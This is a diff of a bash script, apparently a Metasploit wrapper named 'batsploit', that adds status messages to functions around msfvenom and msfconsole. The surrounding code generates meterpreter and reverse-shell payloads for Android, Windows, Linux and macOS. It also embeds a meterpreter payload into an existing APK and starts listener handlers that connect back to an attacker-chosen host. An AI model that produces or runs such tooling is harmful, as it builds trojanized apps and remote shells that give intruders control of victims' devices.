@@ -53,6 +53,7 @@ echo -e "$COLOR"
 android(){
  echo -e "$GREEN"
  read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
+ echo "Generating Payload"
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > Payloads/droid.apk
  echo " "
  echo "droid.apk saved to /batsploit/Payloads"
@@ -65,6 +66,7 @@ android(){
 windows(){
  echo -e "$GREEN"
  read -p "LHOST=" LHOST; read -p "LPORT= " LPORT
+ echo "Generating Payload"
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > Payloads/win.exe
  echo " "
  echo "win.exe saved to /batsploit/Payloads"
@@ -76,6 +78,7 @@ windows(){
 linux(){
  echo -e "$GREEN"
  read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
+ echo "Generating Payload"
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > Payloads/linux.elf
  echo " "
  echo "linux.elf saved to /batsploit/Payloads"
@@ -87,6 +90,7 @@ linux(){
 mac(){
  echo -e "$GREEN"
  read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
+ echo "Generating Payload"
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho > Payloads/mac.macho
  echo " "
  echo "mac.macho saved to /batsploit/Payloads"
@@ -98,6 +102,7 @@ mac(){
 apk(){
  echo -e "$GREEN"
  read -p "Original apk= " BURGER; read -p "LHOST= " LHOST; read -p "LPORT= " LPORT; read -p "New apk= " APP
+ echo "Generating Payload"
  msfvenom -x $BURGER -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $APP
  echo -e "$COLOR"
 
@@ -135,6 +140,7 @@ case $EXPLOIT in
    echo set LHOST $LHOST >> rc/android.rc
    echo set LPORT $LPORT >> rc/android.rc
    echo exploit >> rc/android.rc
+   echo "Accessing Metasploit... "
    msfconsole -r rc/android.rc
    echo -e "$COLOR"
 ;;
@@ -155,6 +161,7 @@ case $EXPLOIT in
    echo set LHOST $LHOST >> rc/windows.rc
    echo set LPORT $LPORT >> rc/windows.rc
    echo exploit >> rc/windows.rc
+   echo "Accessing Metasploit... "
    msfconsole -r rc/windows.rc
    echo "$COLOR"
  ;;
@@ -175,6 +182,7 @@ case $EXPLOIT in
    echo set LHOST $LHOST >> rc/linux.rc
    echo set LPORT $LPORT >> rc/linux.rc
    echo exploit >> rc/linux.rc
+   echo "Accessing Metasploit... "
    msfconsole -r rc/linux.rc
    echo -e "$COLOR"
  ;;
@@ -195,6 +203,7 @@ case $EXPLOIT in
    echo set LHOST $LHOST >> rc/mac.rc
    echo set LPORT $LPORT >> rc/mac.rc
    echo exploit
+   echo "Accessing Metasploit... "
    msfconsole -r rc/mac.rc
    echo -e "$COLOR"
  ;;
